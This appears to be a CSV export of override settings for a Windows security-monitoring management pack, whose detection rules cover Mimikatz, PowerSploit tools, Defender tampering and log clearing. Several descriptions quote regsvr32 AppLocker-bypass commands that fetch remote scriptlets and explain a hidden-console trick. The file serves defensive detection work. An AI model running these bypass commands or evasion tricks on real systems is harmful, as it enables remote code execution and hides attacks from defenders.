The value of this entry is an 8-byte hexadecimal value. The first four bytes (high word) represent the position of the window on the X (horizontal) axis. The last four bytes (low word) represent the position of the window on the Y (vertical) axis.
 
When the WindowPosition value is set to 201329664,  (Hex: 0x0c00 0c00) this places the console in a non-visible section of the user’s screen (where X axis=0c00 and the Y axis=0c00) in an area that is hidden from view below the visible start menu/taskbar 
 
Other console apps that can be modified to make the screen non-visible",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousWindowsPosition,Rule,Security Monitoring;  A suspicious process creation (malicious use of WindowPosition with PowerShell) was executed,"See: https://technet.microsoft.com/en-us/library/cc957410.aspx
The WindowPosition value specifies the position of the command window on the user's screen.
The value of this entry is an 8-byte hexadecimal value. The first four bytes (high word) represent the position of the window on the X (horizontal) axis. The last four bytes (low word) represent the position of the window on the Y (vertical) axis.
 
When the WindowPosition value is set to 201329664,  (Hex: 0x0c00 0c00) this places the console in a non-visible section of the user’s screen (where X axis=0c00 and the Y axis=0c00) in an area that is hidden from view below the visible start menu/taskbar 
 
Other console apps that can be modified to make the screen non-visible",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.DCOUModify,Rule,Security Monitoring: Modification has been made to the DC OU,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.DCOUModify,Rule,Security Monitoring: Modification has been made to the DC OU,,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.DCOUModify,Rule,Security Monitoring: Modification has been made to the DC OU,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousApplockerRegsvr,Rule,Security Monitoring:  A suspicious process creation (AppLocker bypass using regsvr32) was execuited,"AppLocker Bypass Techniques using Regsvr32.exe  (greg)
Note: The following is already contained in SCUBA_RULE_Applocker_Bypass

Examples:
regsvr32 /s /n /u /i:file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.jpg scrobj.dll",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousApplockerRegsvr,Rule,Security Monitoring:  A suspicious process creation (AppLocker bypass using regsvr32) was execuited,"AppLocker Bypass Techniques using Regsvr32.exe  (greg)
Note: The following is already contained in SCUBA_RULE_Applocker_Bypass

Examples:
regsvr32 /s /n /u /i:file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.jpg scrobj.dll",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.4688.SuspiciousApplockerRegsvr,Rule,Security Monitoring:  A suspicious process creation (AppLocker bypass using regsvr32) was execuited,"AppLocker Bypass Techniques using Regsvr32.exe  (greg)
Note: The following is already contained in SCUBA_RULE_Applocker_Bypass

Examples:
regsvr32 /s /n /u /i:file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.jpg scrobj.dll",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.PowerShellLog.GetHTTPStatus,Rule,Security Monitoring:  PowerSploit HTTP Path Discovery Tool is in Use,This tool is used to dictionary a web server to determine the status of a path.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.PowerShellLog.GetHTTPStatus,Rule,Security Monitoring:  PowerSploit HTTP Path Discovery Tool is in Use,This tool is used to dictionary a web server to determine the status of a path.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.PowerShellLog.GetHTTPStatus,Rule,Security Monitoring:  PowerSploit HTTP Path Discovery Tool is in Use,This tool is used to dictionary a web server to determine the status of a path.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory Extended,This rule will generate alerts when an executable is run in an OS Writeable Location. This rule will only run if the extended discovery is turned on.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory Extended,This rule will generate alerts when an executable is run in an OS Writeable Location. This rule will only run if the extended discovery is turned on.,OverrideableFilePath3,string,ReplacewithPathtoOverride,ReplacewithPathtoOverride,ReplacewithPathtoOverride,
Security.Monitoring,Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory Extended,This rule will generate alerts when an executable is run in an OS Writeable Location. This rule will only run if the extended discovery is turned on.,OverrideableExe1,string,ReplacewithExetoOverride,ReplacewithExetoOverride,ReplacewithExetoOverride,
Security.Monitoring,Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory Extended,This rule will generate alerts when an executable is run in an OS Writeable Location. This rule will only run if the extended discovery is turned on.,OverrideableFilePath1,string,ReplacewithPathtoOverride,ReplacewithPathtoOverride,ReplacewithPathtoOverride,
Security.Monitoring,Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory Extended,This rule will generate alerts when an executable is run in an OS Writeable Location. This rule will only run if the extended discovery is turned on.,OverrideableFilePath2,string,ReplacewithPathtoOverride,ReplacewithPathtoOverride,ReplacewithPathtoOverride,
Security.Monitoring,Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory Extended,This rule will generate alerts when an executable is run in an OS Writeable Location. This rule will only run if the extended discovery is turned on.,OverrideableExe3,string,ReplacewithExetoOverride,ReplacewithExetoOverride,ReplacewithExetoOverride,
Security.Monitoring,Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory Extended,This rule will generate alerts when an executable is run in an OS Writeable Location. This rule will only run if the extended discovery is turned on.,OverrideableExe2,string,ReplacewithExetoOverride,ReplacewithExetoOverride,ReplacewithExetoOverride,
Security.Monitoring,Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory Extended,This rule will generate alerts when an executable is run in an OS Writeable Location. This rule will only run if the extended discovery is turned on.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ExecutableRuninWriteableDirectoriesExtended,Rule,Security Monitoring: Executable Run from User Writeable Windows Directory Extended,This rule will generate alerts when an executable is run in an OS Writeable Location. This rule will only run if the extended discovery is turned on.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Accounts.DomainAdminChange,Rule,Security Monitoring:  Domain Admins membership has changed,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Accounts.DomainAdminChange,Rule,Security Monitoring:  Domain Admins membership has changed,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Accounts.DomainAdminChange,Rule,Security Monitoring:  Domain Admins membership has changed,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.PowerShellLog.GetKeystroke,Rule,Security Monitoring:  PowerSploit Key Stroke Logger in Use,This is a PowerSploit tool that can be used to log key strokes.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.PowerShellLog.GetKeystroke,Rule,Security Monitoring:  PowerSploit Key Stroke Logger in Use,This is a PowerSploit tool that can be used to log key strokes.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.PowerShellLog.GetKeystroke,Rule,Security Monitoring:  PowerSploit Key Stroke Logger in Use,This is a PowerSploit tool that can be used to log key strokes.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring Forwarded Events: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring Forwarded Events: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.ExecutableRunFromUserWriteableDirectory,Rule,Security Monitoring Forwarded Events: Executable Run from User Writeable Windows Directory,This rule looks for process creation from executables being run from key windows directories where processes should not be run.,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Collect.SMBv1Connections,Rule,Security Monitoring: Collect SMBv1 Connections,Description for the new rule,Enabled,bool,TRUE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.Collect.SMBv1Connections,Rule,Security Monitoring: Collect SMBv1 Connections,Description for the new rule,IntervalSeconds,int,600,600,600,
Security.Monitoring,Security.Monitoring.Collect.SMBv1Connections,Rule,Security Monitoring: Collect SMBv1 Connections,Description for the new rule,TimeOut,int,300,300,300,
Security.Monitoring,Security.Monitoring.Collect.SMBv1Connections,Rule,Security Monitoring: Collect SMBv1 Connections,Description for the new rule,SyncTime,string,,,,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousCMD,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (cmd) was executed,"These events should be investigated.  We are tracking 4688 events with known strings often found in malicious scripts.  While it is possible that there are normal conditions for this rule, any alert should be investigated immediately.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousCMD,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (cmd) was executed,"These events should be investigated.  We are tracking 4688 events with known strings often found in malicious scripts.  While it is possible that there are normal conditions for this rule, any alert should be investigated immediately.",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousCMD,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (cmd) was executed,"These events should be investigated.  We are tracking 4688 events with known strings often found in malicious scripts.  While it is possible that there are normal conditions for this rule, any alert should be investigated immediately.",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.SystemLogCleared,Rule,Security Monitoring:  The system Log was cleared,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Event.SystemLogCleared,Rule,Security Monitoring:  The system Log was cleared,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.SystemLogCleared,Rule,Security Monitoring:  The system Log was cleared,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.ByPassExecutionPolicy,Rule,Security Monitoring:  PowerShell script run natively to bypass existing execution policy,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to bypass current execution policy. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.Event.ByPassExecutionPolicy,Rule,Security Monitoring:  PowerShell script run natively to bypass existing execution policy,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to bypass current execution policy. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",OverrideablePath2,string,,,,
Security.Monitoring,Security.Monitoring.Event.ByPassExecutionPolicy,Rule,Security Monitoring:  PowerShell script run natively to bypass existing execution policy,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to bypass current execution policy. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",OverrideablePath1,string,,,,
Security.Monitoring,Security.Monitoring.Event.ByPassExecutionPolicy,Rule,Security Monitoring:  PowerShell script run natively to bypass existing execution policy,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to bypass current execution policy. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.ByPassExecutionPolicy,Rule,Security Monitoring:  PowerShell script run natively to bypass existing execution policy,"This may be a normal event, depending on how an IT environment handles scripting. That said, this generates an alert if PowerShell is run to bypass current execution policy. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.EventCollection.LanMan,Rule,Security Monitoring:  Collect LANMAN Authentication,Collection rule to collect all authentication events using LanManager to authenticate. This is an old protocol that has known vulnerabilities and should be shut off.,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.EventCollection.LanMan,Rule,Security Monitoring:  Collect LANMAN Authentication,Collection rule to collect all authentication events using LanManager to authenticate. This is an old protocol that has known vulnerabilities and should be shut off.,AllowProxying,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.SystemLogCleared,Rule,Security Monitoring Forwarded Events:  System Log was Cleared,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.SystemLogCleared,Rule,Security Monitoring Forwarded Events:  System Log was Cleared,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.SystemLogCleared,Rule,Security Monitoring Forwarded Events:  System Log was Cleared,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.SeDebugPrivilegeEscalation,Rule,Security Monitoring: SeDebugPrivilege Escalation Detected,This alert is generated when a process other than WMI assigns itself debug privileges.,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.Event.SeDebugPrivilegeEscalation,Rule,Security Monitoring: SeDebugPrivilege Escalation Detected,This alert is generated when a process other than WMI assigns itself debug privileges.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.SeDebugPrivilegeEscalation,Rule,Security Monitoring: SeDebugPrivilege Escalation Detected,This alert is generated when a process other than WMI assigns itself debug privileges.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerRegsvr,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (AppLocker bypass using regsvr32) was execuited,"AppLocker Bypass Techniques using Regsvr32.exe  (greg)
Note: The following is already contained in SCUBA_RULE_Applocker_Bypass

Examples:
regsvr32 /s /n /u /i:file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.jpg scrobj.dll",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerRegsvr,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (AppLocker bypass using regsvr32) was execuited,"AppLocker Bypass Techniques using Regsvr32.exe  (greg)
Note: The following is already contained in SCUBA_RULE_Applocker_Bypass

Examples:
regsvr32 /s /n /u /i:file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.jpg scrobj.dll",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousApplockerRegsvr,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (AppLocker bypass using regsvr32) was execuited,"AppLocker Bypass Techniques using Regsvr32.exe  (greg)
Note: The following is already contained in SCUBA_RULE_Applocker_Bypass

Examples:
regsvr32 /s /n /u /i:file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll
regsvr32 /s /n /u /i:http://server/file.jpg scrobj.dll",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.WMIRemote.Source,Rule,Security Monitoring:  Possible WMI Remote Attempt Made From this System,See this article for details.  https://nathangau.wordpress.com/2019/03/15/security-monitoring-using-scom-to-detect-remote-wmi-attempts/,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.Event.WMIRemote.Source,Rule,Security Monitoring:  Possible WMI Remote Attempt Made From this System,See this article for details.  https://nathangau.wordpress.com/2019/03/15/security-monitoring-using-scom-to-detect-remote-wmi-attempts/,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.WMIRemote.Source,Rule,Security Monitoring:  Possible WMI Remote Attempt Made From this System,See this article for details.  https://nathangau.wordpress.com/2019/03/15/security-monitoring-using-scom-to-detect-remote-wmi-attempts/,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeEncodedCommand,Rule,Security Monitoring Forwarded Events:  PowerShell used to Invoke an Encoded Command,"One way to get around PowerShell parsing issues is to encode a command to a Base64 string. An attacker can also use this to obscure what they are really doing. This may be normal, and it may be malicious. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeEncodedCommand,Rule,Security Monitoring Forwarded Events:  PowerShell used to Invoke an Encoded Command,"One way to get around PowerShell parsing issues is to encode a command to a Base64 string. An attacker can also use this to obscure what they are really doing. This may be normal, and it may be malicious. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeEncodedCommand,Rule,Security Monitoring Forwarded Events:  PowerShell used to Invoke an Encoded Command,"One way to get around PowerShell parsing issues is to encode a command to a Base64 string. An attacker can also use this to obscure what they are really doing. This may be normal, and it may be malicious. See https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/ and https://nathangau.wordpress.com/2018/09/07/security-monitoring-additional-powershell-detections/ for details.",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousWindowsPosition,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (malicious use of WindowPosition with PowerShell) was executed,"See: https://technet.microsoft.com/en-us/library/cc957410.aspx
The WindowPosition value specifies the position of the command window on the user's screen.
The value of this entry is an 8-byte hexadecimal value. The first four bytes (high word) represent the position of the window on the X (horizontal) axis. The last four bytes (low word) represent the position of the window on the Y (vertical) axis.
 
When the WindowPosition value is set to 201329664,  (Hex: 0x0c00 0c00) this places the console in a non-visible section of the user’s screen (where X axis=0c00 and the Y axis=0c00) in an area that is hidden from view below the visible start menu/taskbar 
 
Other console apps that can be modified to make the screen non-visible",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousWindowsPosition,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (malicious use of WindowPosition with PowerShell) was executed,"See: https://technet.microsoft.com/en-us/library/cc957410.aspx
The WindowPosition value specifies the position of the command window on the user's screen.
The value of this entry is an 8-byte hexadecimal value. The first four bytes (high word) represent the position of the window on the X (horizontal) axis. The last four bytes (low word) represent the position of the window on the Y (vertical) axis.
 
When the WindowPosition value is set to 201329664,  (Hex: 0x0c00 0c00) this places the console in a non-visible section of the user’s screen (where X axis=0c00 and the Y axis=0c00) in an area that is hidden from view below the visible start menu/taskbar 
 
Other console apps that can be modified to make the screen non-visible",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.ForwardedEvents.4688.SuspiciousWindowsPosition,Rule,Security Monitoring Forwarded Events:  A suspicious process creation (malicious use of WindowPosition with PowerShell) was executed,"See: https://technet.microsoft.com/en-us/library/cc957410.aspx
The WindowPosition value specifies the position of the command window on the user's screen.
The value of this entry is an 8-byte hexadecimal value. The first four bytes (high word) represent the position of the window on the X (horizontal) axis. The last four bytes (low word) represent the position of the window on the Y (vertical) axis.
 
When the WindowPosition value is set to 201329664,  (Hex: 0x0c00 0c00) this places the console in a non-visible section of the user’s screen (where X axis=0c00 and the Y axis=0c00) in an area that is hidden from view below the visible start menu/taskbar 
 
Other console apps that can be modified to make the screen non-visible",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.APPLocker.PSExec,Rule,Security Monitoring:  PSEXEC in Use,,Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.APPLocker.PSExec,Rule,Security Monitoring:  PSEXEC in Use,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.APPLocker.PSExec,Rule,Security Monitoring:  PSEXEC in Use,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.Event.KillWindowsDefender,Rule,Security Monitoring:  An attempt was made to kill Windows Defender,"This rule looks for 4688 events where a command was initiated to stop MsMpEng.exe, which is a windows defender core process. Audit process creation must be turned on. As well, the option to include command line in process creation events must also be on.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.Event.KillWindowsDefender,Rule,Security Monitoring:  An attempt was made to kill Windows Defender,"This rule looks for 4688 events where a command was initiated to stop MsMpEng.exe, which is a windows defender core process. Audit process creation must be turned on. As well, the option to include command line in process creation events must also be on.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.Event.KillWindowsDefender,Rule,Security Monitoring:  An attempt was made to kill Windows Defender,"This rule looks for 4688 events where a command was initiated to stop MsMpEng.exe, which is a windows defender core process. Audit process creation must be turned on. As well, the option to include command line in process creation events must also be on.",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Accounts.SchemaAdminChange,Rule,Security Monitoring:  Schema Admins membership has changed,,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,SecurityMonitoringMP.Accounts.SchemaAdminChange,Rule,Security Monitoring:  Schema Admins membership has changed,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Accounts.SchemaAdminChange,Rule,Security Monitoring:  Schema Admins membership has changed,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.GetDLLLoadPath,Rule,Security Monitoring ForwardedEvents:  Powersploit Get DLL Load Path is in Use,Get-DLLLoad Path is used to find the name and location of a DLL that an application is using.  The DLL can then be replaced with a malicious copy.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.GetDLLLoadPath,Rule,Security Monitoring ForwardedEvents:  Powersploit Get DLL Load Path is in Use,Get-DLLLoad Path is used to find the name and location of a DLL that an application is using.  The DLL can then be replaced with a malicious copy.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.GetDLLLoadPath,Rule,Security Monitoring ForwardedEvents:  Powersploit Get DLL Load Path is in Use,Get-DLLLoad Path is used to find the name and location of a DLL that an application is using.  The DLL can then be replaced with a malicious copy.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.LocalAccountCreatedonServer,Rule,Security Monitoring: Local account created on a member server,"In a normal environment, this will only happen when the system is setup. You should not see this event on production member servers at all",Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.LocalAccountCreatedonServer,Rule,Security Monitoring: Local account created on a member server,"In a normal environment, this will only happen when the system is setup. You should not see this event on production member servers at all",Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.Event.LocalAccountCreatedonServer,Rule,Security Monitoring: Local account created on a member server,"In a normal environment, this will only happen when the system is setup. You should not see this event on production member servers at all",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeMimikatzInUse,Rule,Security Monitoring:  Invoke-Mimikatz is in Use.,Description for the new alert rule.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeMimikatzInUse,Rule,Security Monitoring:  Invoke-Mimikatz is in Use.,Description for the new alert rule.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.PowerShellLog.InvokeMimikatzInUse,Rule,Security Monitoring:  Invoke-Mimikatz is in Use.,Description for the new alert rule.,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.SoftwareInstallOnServer,Rule,Security Monitoring:  Software was Installed on a Server,"This rule look sfor 11707 events in the application log and alerts accordingly.  Note that patches will likely be flagged with this rule, so it should be turned on if there is a good maintenance process in place",Enabled,bool,FALSE,FALSE,FALSE,
Security.Monitoring,SecurityMonitoringMP.Event.SoftwareInstallOnServer,Rule,Security Monitoring:  Software was Installed on a Server,"This rule look sfor 11707 events in the application log and alerts accordingly.  Note that patches will likely be flagged with this rule, so it should be turned on if there is a good maintenance process in place",Severity,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.Event.SoftwareInstallOnServer,Rule,Security Monitoring:  Software was Installed on a Server,"This rule look sfor 11707 events in the application log and alerts accordingly.  Note that patches will likely be flagged with this rule, so it should be turned on if there is a good maintenance process in place",Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.GPOMonitoring.EventAndScript.Rule,Rule,GPO Change Event then run correlation script Rule,,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.GPOMonitoring.EventAndScript.Rule,Rule,GPO Change Event then run correlation script Rule,,AGPMDomain,string,Thisisaplaceholder,Thisisaplaceholder,Thisisaplaceholder,
Security.Monitoring,SecurityMonitoringMP.GPOMonitoring.EventAndScript.Rule,Rule,GPO Change Event then run correlation script Rule,,AGPMAccount,string,Thisisaplaceholder,Thisisaplaceholder,Thisisaplaceholder,
Security.Monitoring,SecurityMonitoringMP.GPOMonitoring.EventAndScript.Rule,Rule,GPO Change Event then run correlation script Rule,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.GPOMonitoring.EventAndScript.Rule,Rule,GPO Change Event then run correlation script Rule,,Priority,int,1,1,1,
Security.Monitoring,SecurityMonitoringMP.APPLocker.ProhibitedApp,Rule,Security Monitoring:  Prohibited App in Use,,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,SecurityMonitoringMP.APPLocker.ProhibitedApp,Rule,Security Monitoring:  Prohibited App in Use,,Severity,int,2,2,2,
Security.Monitoring,SecurityMonitoringMP.APPLocker.ProhibitedApp,Rule,Security Monitoring:  Prohibited App in Use,,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.CollectLegacyTLSEvents,Rule,Security Monitoring: Collect Legacy TLS Events,This collection rule will collect events created from TLS 1.0 or TLS 1.1. Run the associated report to see where this is happening in your environment.,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.CollectLegacyTLSEvents,Rule,Security Monitoring: Collect Legacy TLS Events,This collection rule will collect events created from TLS 1.0 or TLS 1.1. Run the associated report to see where this is happening in your environment.,AllowProxying,bool,FALSE,FALSE,FALSE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.KillWindowsDefender,Rule,Security Monitoring Forwarded Events:  An attempt was made to kill Windows Defender,"This rule looks for 4688 events where a command was initiated to stop MsMpEng.exe, which is a windows defender core process. Audit process creation must be turned on. As well, the option to include command line in process creation events must also be on.",Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.KillWindowsDefender,Rule,Security Monitoring Forwarded Events:  An attempt was made to kill Windows Defender,"This rule looks for 4688 events where a command was initiated to stop MsMpEng.exe, which is a windows defender core process. Audit process creation must be turned on. As well, the option to include command line in process creation events must also be on.",Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.KillWindowsDefender,Rule,Security Monitoring Forwarded Events:  An attempt was made to kill Windows Defender,"This rule looks for 4688 events where a command was initiated to stop MsMpEng.exe, which is a windows defender core process. Audit process creation must be turned on. As well, the option to include command line in process creation events must also be on.",Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.GPOCreation,Rule,Security Monitoring: A GPO was Created,A new GPO has been createed,Enabled,bool,TRUE,TRUE,FALSE,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.GPOCreation,Rule,Security Monitoring: A GPO was Created,A new GPO has been createed,AGPMAccount,string,Thisisaplaceholder,Thisisaplaceholder,Thisisaplaceholder,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.GPOCreation,Rule,Security Monitoring: A GPO was Created,A new GPO has been createed,AGPMDomain,string,Thisisaplaceholder,Thisisaplaceholder,Thisisaplaceholder,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.GPOCreation,Rule,Security Monitoring: A GPO was Created,A new GPO has been createed,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.SecurityMonitoring.Event.GPOCreation,Rule,Security Monitoring: A GPO was Created,A new GPO has been createed,Priority,int,1,1,1,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeNinjaCopy,Rule,Security Monitoring Forwarded Events:  Invoke Ninja Copy is in Use,This tool allows an attacker to make an offline copy of protected OS Secrets (i.e. the SAM) while they are in use.,Enabled,bool,TRUE,TRUE,TRUE,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeNinjaCopy,Rule,Security Monitoring Forwarded Events:  Invoke Ninja Copy is in Use,This tool allows an attacker to make an offline copy of protected OS Secrets (i.e. the SAM) while they are in use.,Severity,int,2,2,2,
Security.Monitoring,Security.Monitoring.ForwardedEvents.InvokeNinjaCopy,Rule,Security Monitoring Forwarded Events:  Invoke Ninja Copy is in Use,This tool allows an attacker to make an offline copy of protected OS Secrets (i.e. the SAM) while they are in use.,Priority,int,1,1,1,
